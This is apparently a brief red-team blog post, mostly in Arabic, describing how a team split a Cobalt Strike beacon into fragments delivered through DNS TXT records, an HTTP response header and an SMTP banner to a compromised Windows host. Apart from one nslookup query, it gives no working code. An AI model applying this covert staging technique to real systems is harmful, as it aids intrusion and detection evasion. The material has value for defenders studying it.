---
title: "Infiltrationar"
date: 2022-01-03T16:57:00-05:00
---


## Introduction

<DIV dir="rtl" align="right">
ألسلام عليكم
</DIV>

<DIV dir="rtl" align="right">
سمعنا كثير عن طرق تستخدم لنقل الملفات لجهاز الضحية ومعظم هذه الطرق صارة منتشرة الا درجة انها صارت سهلة الأكتشاف. في Confidential اتخذنا خطوة جديدة في نقل الملفات مما خلاها معقدة ليتم اكتشافها. رح تشوفون اليوم كيف قدرنا ننقل CS beacon عن طريق اكثر من medium. 
</DIV>

## Brief

<DIV dir="rtl" align="right">
في البداية قسمنا ال CS beacon الى عدة قطع والي بعدين رح يتم نقلها عن طريق اكثر من medium (DNS TXT record, HTTP response header, and SMTP server's banner) وكل هذا يصير عن طريق برنامج خاص بالفريق وتقدرون تشوفون ال demo في النهاية.
</DIV>

## DNS txt record:

<DIV dir="rtl" align="right">
تعريف ال TXT record من Google:
</DIV>

TXT records are a type of Domain Name System (DNS) record that contains text information.

<DIV dir="rtl" align="right">
بأختصار نقدر نضيف وحدة من القطع المقسمة الخاصة ب CS beacon في TXT dns record في هذه الحالة اذا حاولنا نطلب هذه ال record رح ترجع لنا واحد من القطع
</DIV>

```
nslookup -querytype=txt confidential.example.com
```

![](nslookup output)

## HTTP Response Header:

<DIV dir="rtl" align="right">
عدلنا على اعدادات ال web server وظفنا header جديد اسمه Confidential يكون موجود في ال response ويحتوي على القطعة الثانية من ال CS Beacon
</DIV>

![](HTTP Response Header output)


## SMTP Server's Banner:

<DIV dir="rtl" align="right">
عدلنا على اعدادات ال SMTP Server وظفنا اخر قطعة في ال banner
</DIV>

Pic 3 ( SMTP Server's Banner output )


## Demo

Our team developed a tool that automates the process with more features. Here's a demo of the executable agent that we fired up inside the compromised windows machine.

## Refrences:

- https://support.google.com/a/answer/2716800?hl=en
- https://github.com/PaloAltoNetworks/research-notes/blob/master/notes/DNS-based%20data%20exfiltration%20and%20infiltration%20technology%20and%20detection.pdf
